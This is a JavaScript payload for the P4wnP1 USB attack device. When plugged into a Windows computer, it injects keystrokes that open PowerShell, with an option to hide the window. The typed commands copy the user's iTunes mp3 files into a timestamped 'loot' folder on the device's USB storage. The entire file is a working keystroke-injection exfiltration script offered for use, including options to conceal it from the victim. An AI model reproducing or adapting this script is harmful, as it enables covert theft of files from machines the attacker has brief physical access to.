/*##################################################################################\
# music_extraction.js                                                               #
#   This script will extract all saved music files from iTunes standard             #
#   directory and save them to P4wnP1.                                              #
#                                                                                   #
#   Author: Saytonic                                                                #
#   Edited by: chriskalv                                                            #
#                                                                                   #
# PREREQUISTES:                                                                     #
#   - Enable keyboard and USB storage capability on your P4wnP1.                    #
\##################################################################################*/


/////////////////////////////// SETTINGS //////////////////////////////\
// GENERAL                                                             // ---
layout("de");                                                          // Keyboard layout
typingSpeed(0,0);                                                      // Typing = really fast
hide=false;                                                            // Set to true to hide the console window on the target
exit=true;                                                             // Set to true to exit the console once finished
var usb_drive = "TEMPUSB"                                              // The name of the P4wnP1's USB storage device
////////////////////////////////////////////////////////////////////////

// Definition of other variables, arrays, ...
var delay_time = 5                             // The time to wait before executing the attack in seconds
var ready = "False"                            // Used to make sure that the attack is ready to be executed

// FUNCTIONS
function attack() {
    press("GUI r");
    delay(500);
    if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");
    delay(1000);

// Find the P4wnP1 USB drive, create /loot path with current timestamp and get other necessary path info
    type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name);");
    type("$timestamp = Get-Date -Format '(dd-MM-yyyy_HH-mm)';");
    type("$lootfolder = 'music_loot_' +$timestamp;");
    type("$lootPathItunes = $usbPath+ '' +$lootfolder+ '\\itunes\';mkdir $lootPathItunes;");

// Copy files
    type("Get-ChildItem '$env:SystemDrive\\Users\\$env:UserName\\Music\\iTunes\\iTunes Media\\' -Recurse -Include *.mp3 | ForEach-Object ` {copy $_ -Destination $lootPathItunes};");  

//Exit the console if chosen to do so      
    if (exit) { type("exit\n"); }
}
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");                      // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10)           // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {                  // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True";                   // Stop the while loop
            break;
        }
    }
}

delay(delay_time * 100);
check_if_ready();
attack();
